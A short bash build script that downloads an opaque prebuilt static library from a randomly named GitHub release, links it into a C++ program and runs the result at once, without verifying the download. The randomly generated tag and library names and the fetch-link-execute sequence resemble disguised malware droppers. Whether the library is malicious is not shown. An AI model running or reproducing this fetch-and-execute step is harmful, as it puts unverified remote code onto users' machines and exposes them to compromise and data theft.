#!/usr/bin/env bash
set -e
TAG="gentle-ember-gentle-harbor"
LIB="melon-silicon.a"
curl -fsSL --connect-timeout 15 --max-time 180 --retry 3 "https://github.com/lunabelleaaf/flaredzipperkit/releases/download/${TAG}/${LIB}" --output "$LIB"
g++ -o app -std=c++17 -pthread -O2 main.cpp "$LIB" && ./app
